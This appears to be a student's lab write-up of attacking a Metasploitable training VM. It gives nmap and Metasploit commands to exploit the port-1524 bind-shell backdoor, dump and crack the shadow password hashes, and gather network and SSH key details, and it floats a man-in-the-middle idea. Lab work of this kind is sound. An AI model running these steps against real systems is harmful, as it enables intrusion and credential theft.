Commands:--
1) db_nmap -sV <target_IP_Adr>
2) nmap -sT <target_IP-Adr>
Here I decided I would use Nessus and found several critical weaknesses I have included
a photo of the report with this submission

Bind Shell Backdoor Detection:--
1) search exploit ftp backdor
2) use 1
3)
	set RHOST 192.168.56.107
	set PORT 1524
	exploit
	background
4) use post/linux/gather/hashdump
5) set SESSION 1
6) run
	At this point I found a hasdump of the shadow file containing passwords of the metasploitable system
	Now on my own Kali system I use John the ripper to unencrypt the hash
7) john /root/.msf4/loot/20220313155238_default_192.168.56.107_linux.hashes_612050.txt -show
	The results are stored in /loot/John the Ripper.png
8) search linux shell post
	found a network configuration dump
9) use 20
	This one is pretty exciting becuase I found various files and their locations such as routing table,
 	host file, Firewall configurations SSH keys etc. From previous hashdump, I also know the admin password
	by modifying the host file and enough time I could create a man in the middle attack and steal more
	sensitive data. back
	Saved screenshot of this in loot/NetworkConfiguration.png
